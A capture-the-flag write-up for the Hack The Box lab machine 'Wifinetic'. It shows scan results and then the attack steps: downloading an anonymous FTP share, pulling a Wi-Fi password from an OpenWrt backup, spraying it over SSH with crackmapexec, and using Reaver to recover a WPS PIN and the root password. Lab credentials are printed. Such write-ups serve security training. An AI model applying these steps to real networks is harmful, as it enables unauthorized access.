## Wifinetic

| Name      | IP           | Difficulty | OS    |
| --------- | ------------ | ---------- | ----- |
| wifinetic | 10.10.11.247 | Easy       | Linux |

## NMAP

| HOST                         | PORT | PROTO | SERVICE | VERSION                 |
| ---------------------------- | ---- | ----- | ------- | ----------------------- |
| 10.10.11.247 (wifinetic.htb) | 21   | tcp   | vsftpd  | 3.0.3                   |
| 10.10.11.247 (wifinetic.htb) | 22   | tcp   | OpenSSH | 8.2p1 Ubuntu 4ubuntu0.9 |
| 10.10.11.247 (wifinetic.htb) | 53   | tcp   |         |                         |

## USERS

- HR Manager: samantha.wood93
- Wireless Network Admin: olivia.walker17
- netadmin:VeRyUniUqWiFIPasswrd1!
- root

## NOTES

- Anonymous FTP login allowed 
```
| -rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
| -rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
| -rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf 
| -rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf 
```
- Recursively download files from the FTP server `wget -r ftp://10.10.11.247/`
- Unzip the .tar file `tar -xvf backup-OpenWrt-2023-07-26.tar`
- Get network key `cat etc/config/wireless` SSID: `OpenWrt` Password: `VeRyUniUqWiFIPasswrd1!`
- Spray SSH with the wireless password and usernames gathered from the `.pdf` and `etc/passwd` files `cme ssh 10.10.11.247 -u users.txt -p 'VeRyUniUqWiFIPasswrd1!'`
- netadmin has shell access
- The user flag is in netadmin's home directory
- Reaver has network capability `/usr/bin/reaver = cap_net_raw+ep`
- Scan network interfaces `iwlist scan`
- wlan0 BSSID: `02:00:00:00:00:00`
- Find monitor interface `wlan0` with `iwconfig`
- Use Reaver to get the PIN: `12345670` and Password: `WhatIsRealAnDWhAtIsNot51121!`
- Login to `root` with the password
- The root flag is in the root user's home directory
